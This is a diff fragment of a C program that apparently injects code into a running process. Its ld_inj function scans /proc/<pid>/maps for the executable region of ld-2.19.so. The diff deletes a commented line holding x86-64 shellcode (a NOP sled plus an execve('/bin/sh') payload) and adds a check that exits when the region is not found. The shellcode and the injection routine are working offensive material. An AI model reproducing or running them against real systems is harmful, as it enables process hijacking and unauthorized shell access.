@@ -1,5 +1,3 @@
-/*export A=$(python -c "print '\x90' * 20 +'\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -45,7 +43,7 @@ void ld_inj(pid_t pid, struct user_regs_struct registers)
 	char path[32];
 	char *wanted;
 	FILE *my_map;
-	int size, i;
+	int size, i, check = 0;
 
 	sprintf(path, "/proc/%d/maps", pid);
 	my_map = fopen(path, "r");
@@ -54,11 +52,16 @@ void ld_inj(pid_t pid, struct user_regs_struct registers)
 
 	while(fgets(buff,sizeof(buff), my_map) != NULL)
 	{	
-		//printf("%s", buff);
 		if(strstr(buff, "r-xp") && strstr(buff, "/lib/x86_64-linux-gnu/ld-2.19.so"))
 		{
+			check = 1;
 			break;
 		}
+	}
+	if(!check)
+	{
+		printf("Unable to find ld-2.19.so address.\nExit..");
+		exit(1);
 	}
 	printf("######### FOUND EXECUTABLE ZONE ##########\n\n");
 	printf(" %s\n", buff);
